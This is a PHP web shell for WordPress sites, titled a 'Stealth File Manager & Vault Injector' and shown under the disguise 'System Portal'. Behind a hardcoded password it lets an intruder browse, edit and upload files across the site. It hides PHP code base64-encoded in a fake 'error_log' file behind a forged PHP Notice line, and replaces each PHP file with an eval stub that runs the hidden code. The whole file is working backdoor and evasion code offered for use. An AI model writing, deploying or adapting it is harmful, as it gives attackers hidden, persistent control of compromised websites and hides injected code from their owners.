<?php
/**
 * Standalone Stealth File Manager & Vault Injector
 * Place this in: wp-content/manager.php
 */
declare(strict_types=1);
session_start();

define('ACCESS_SECRET', 'admin2026'); // Change this password
define('VAULT_PATH', __DIR__ . '/error_log'); 

// 1. Vault Sync Engine
function sync_to_vault($file_path, $content = null) {
    if ($content === null && file_exists($file_path)) {
        $content = @file_get_contents($file_path);
    }
    if (empty($content) && $content !== '') return;

    $fake_error = "[Mon Aug 31 19:29:47 2026] PHP Notice: Undefined index: HTTP_USER_AGENT in /var/www/html/wp-includes/functions.php on line 4124\n";
    $registry = [];

    if (file_exists(VAULT_PATH)) {
        $raw = @file_get_contents(VAULT_PATH);
        $parts = explode("\n", $raw, 2);
        if (isset($parts[1])) {
            $registry = @json_decode(trim($parts[1]), true) ?: [];
        }
    }

    $registry[$file_path] = base64_encode($content);
    @file_put_contents(VAULT_PATH, $fake_error . json_encode($registry), LOCK_EX);
}

// Generates the execution stub for PHP files
function get_php_stub() {
    $v_path = var_export(VAULT_PATH, true);
    return "<?php \$v={$v_path};\$d=@file_get_contents(\$v);if(\$d){\$p=explode(\"\\n\",\$d,2);if(isset(\$p[1])){\$r=@json_decode(trim(\$p[1]),true);if(isset(\$r[__FILE__]))eval('?>'.base64_decode(\$r[__FILE__]));}}";
}

sync_to_vault(__FILE__);

// 3. API Router
if (isset($_GET['api'])) {
    header('Content-Type: application/json; charset=utf-8');
    
    $req_pass = $_POST['auth'] ?? '';
    if (empty($_SESSION['auth']) && $req_pass !== ACCESS_SECRET) {
        http_response_code(401);
        die(json_encode(['success' => false, 'error' => 'Unauthorized']));
    }
    if ($req_pass === ACCESS_SECRET) $_SESSION['auth'] = true;

    $action = $_GET['api'];
    $root = dirname(__DIR__); 
    
    $resolve = fn($p) => realpath($root . '/' . ltrim(str_replace(['../','..\\'], '', $p), '/\\')) ?: $root . '/' . ltrim($p, '/');

    if ($action === 'auth') die(json_encode(['success' => true]));
    
    if ($action === 'list') {
        $target = file_exists($resolve($_GET['dir'] ?? '')) ? $resolve($_GET['dir'] ?? '') : $root;
        $items = [];
        foreach (new DirectoryIterator($target) as $item) {
            if ($item->isDot()) continue;
            $items[] = ['name' => $item->getFilename(), 'is_dir' => $item->isDir(), 'size' => $item->getSize(), 'mtime' => date('Y-m-d H:i', $item->getMTime())];
        }
        usort($items, fn($a, $b) => $b['is_dir'] <=> $a['is_dir'] ?: strcasecmp($a['name'], $b['name']));
        die(json_encode(['success' => true, 'dir' => trim(str_replace($root, '', str_replace('\\', '/', $target)), '/'), 'items' => $items]));
    }

    if ($action === 'read') {
        $target = $resolve($_GET['file'] ?? '');
        $content = '';
        if (is_file($target)) {
            $content = file_get_contents($target);
            // If PHP, try pulling the real code from the vault so you can edit it properly
            if (strtolower(pathinfo($target, PATHINFO_EXTENSION)) === 'php') {
                $raw = @file_get_contents(VAULT_PATH);
                $parts = explode("\n", $raw, 2);
                if (isset($parts[1])) {
                    $registry = @json_decode(trim($parts[1]), true) ?: [];
                    if (isset($registry[$target])) {
                        $content = base64_decode($registry[$target]);
                    }
                }
            }
        }
        die(json_encode(['success' => is_file($target), 'content' => $content]));
    }

    if ($action === 'save') {
        $target = $resolve($_POST['file'] ?? '');
        $content = $_POST['content'] ?? '';
        $is_php = strtolower(pathinfo($target, PATHINFO_EXTENSION)) === 'php';
        
        sync_to_vault($target, $content);

        // Drop the stub if it's a PHP file (and not the manager itself)
        if ($is_php && $target !== __FILE__) {
            $content = get_php_stub();
        }

        $written = @file_put_contents($target, $content, LOCK_EX);
        die(json_encode(['success' => $written !== false]));
    }

    if ($action === 'upload') {
        $dest = $resolve($_POST['dir'] ?? '') . '/' . basename($_FILES['file']['name']);
        $tmp = $_FILES['file']['tmp_name'];
        $is_php = strtolower(pathinfo($dest, PATHINFO_EXTENSION)) === 'php';
        
        $content = file_get_contents($tmp);
        sync_to_vault($dest, $content);

        if ($is_php && $dest !== __FILE__) {
            $stub = get_php_stub();
            file_put_contents($dest, $stub, LOCK_EX);
            @unlink($tmp);
            die(json_encode(['success' => true]));
        } else {
            if (move_uploaded_file($tmp, $dest)) {
                die(json_encode(['success' => true]));
            }
        }
        die(json_encode(['success' => false]));
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>System Portal</title>
    <style>
        body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
        .box { max-width: 900px; margin: 0 auto; background: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 5px; }
        input, button, textarea { background: #0d1117; color: #c9d1d9; border: 1px solid #30363d; padding: 5px 10px; }
        button { cursor: pointer; background: #238636; border: none; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; text-align: left; }
        th, td { border-bottom: 1px solid #30363d; padding: 8px; }
        a { color: #58a6ff; text-decoration: none; cursor: pointer; }
        .hidden { display: none; }
        #editor { width: 100%; height: 400px; margin-top: 10px; }
    </style>
</head>
<body>
<div class="box">
    <div id="auth-ui">
        Access Key: <input type="password" id="pwd"> <button onclick="auth()">Enter</button>
    </div>
    <div id="app-ui" class="hidden">
        <div style="margin-bottom: 15px;">
            <input type="file" id="upload-file"> <button onclick="upload()">Upload to Current Dir</button>
            <span style="float:right;" id="path"></span>
        </div>
        <table id="list"></table>
        <div id="edit-ui" class="hidden">
            <h3 id="editing"></h3>
            <textarea id="editor"></textarea><br><br>
            <button onclick="save()">Commit & Vault</button> <button onclick="closeEdit()" style="background:#da3633">Cancel</button>
        </div>
    </div>
</div>
<script>
let current = ''; let editing = '';
async function req(ep, body = null) {
    let opt = body ? { method: 'POST', body } : {};
    let r = await fetch(`?api=${ep}`, opt);
    if (r.status === 401) { document.getElementById('auth-ui').classList.remove('hidden'); document.getElementById('app-ui').classList.add('hidden'); }
    return r.json();
}
async function auth() {
    let f = new FormData(); f.append('auth', document.getElementById('pwd').value);
    let r = await req('auth', f);
    if (r.success) { document.getElementById('auth-ui').classList.add('hidden'); document.getElementById('app-ui').classList.remove('hidden'); load(''); }
}
async function load(dir) {
    let r = await req(`list&dir=${encodeURIComponent(dir)}`);
    if (!r.success) return;
    current = r.dir; document.getElementById('path').innerText = '/' + current;
    let html = current ? `<tr><td colspan="4"><a onclick="load('${current.split('/').slice(0,-1).join('/')}')">📁 ..</a></td></tr>` : '';
    r.items.forEach(i => {
        let path = current ? current + '/' + i.name : i.name;
        html += `<tr><td><a onclick="${i.is_dir ? `load('${path}')` : `edit('${path}')`}">${i.is_dir ? '📁' : '📄'} ${i.name}</a></td><td>${i.is_dir ? '-' : i.size}</td><td>${i.mtime}</td></tr>`;
    });
    document.getElementById('list').innerHTML = html;
}
async function edit(file) {
    let r = await req(`read&file=${encodeURIComponent(file)}`);
    if (r.success) {
        editing = file; document.getElementById('editing').innerText = file;
        document.getElementById('editor').value = r.content;
        document.getElementById('list').classList.add('hidden');
        document.getElementById('edit-ui').classList.remove('hidden');
    }
}
function closeEdit() { document.getElementById('list').classList.remove('hidden'); document.getElementById('edit-ui').classList.add('hidden'); }
async function save() {
    let f = new FormData(); f.append('file', editing); f.append('content', document.getElementById('editor').value);
    let r = await req('save', f);
    if (r.success) { alert('Saved & Vaulted'); closeEdit(); } else alert('Fail');
}
async function upload() {
    let file = document.getElementById('upload-file').files[0];
    if (!file) return;
    let f = new FormData(); f.append('dir', current); f.append('file', file);
    let r = await req('upload', f);
    if (r.success) load(current);
}
if (document.cookie.includes('PHPSESSID')) auth();
</script>
</body>
</html>